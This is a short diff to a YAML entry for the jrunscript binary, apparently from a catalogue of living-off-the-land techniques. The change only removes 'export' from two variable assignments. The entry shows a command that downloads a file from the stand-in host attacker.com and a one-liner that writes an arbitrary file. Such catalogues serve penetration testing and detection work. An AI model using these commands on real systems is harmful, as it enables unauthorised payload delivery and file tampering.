@@ -22,8 +22,8 @@ functions:
   file-download:
     - description: Fetch a remote file via HTTP GET request.
       code: |
-        export URL=http://attacker.com/file_to_get
-        export LFILE=file_to_save
+        URL=http://attacker.com/file_to_get
+        LFILE=file_to_save
         jrunscript -e "cp('$URL','$LFILE')"
   file-write:
     - code: jrunscript -e 'var fw=new java.io.FileWriter("./file_to_write"); fw.write("DATA"); fw.close();'
